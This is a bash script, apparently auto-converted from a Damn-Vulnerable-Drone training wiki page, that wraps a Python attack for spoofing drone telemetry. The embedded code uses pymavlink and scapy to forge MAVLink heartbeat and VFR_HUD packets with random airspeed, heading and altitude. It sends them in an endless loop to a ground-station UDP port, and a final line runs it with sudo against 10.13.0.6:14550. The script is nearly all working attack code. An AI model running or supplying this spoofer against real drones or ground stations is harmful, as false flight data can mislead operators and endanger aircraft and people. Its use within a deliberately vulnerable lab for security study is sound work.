#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/VFR-HUD-Spoofing.md
# Created: 2025-11-23 15:43:26
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=vfr-hud-spoofing src=VFR-HUD-Spoofing.md"
log "[BLOCK 1] type=python"
python3 - <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_vfr_hud():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    airspeed = random.uniform(0, 20)
    groundspeed = random.uniform(0, 20)
    heading = random.randint(0, 360)
    altitude = random.uniform(0, 100)
    climb = random.uniform(-5, 5)

    return mav.vfr_hud_encode(
        airspeed=airspeed,
        groundspeed=groundspeed,
        heading=heading,
        throttle=0,
        alt=altitude,
        climb=climb
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python vfr-hud-spoofing.py <ip:port>")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_vfr_hud(), target_ip, target_port)
        print(f"Sent heartbeat and VFR_HUD packets to {target_ip}:{target_port}")
PY

log "[BLOCK 2] type=shell"
sudo python3 vfr-hud-spoofing.py 10.13.0.6:14550

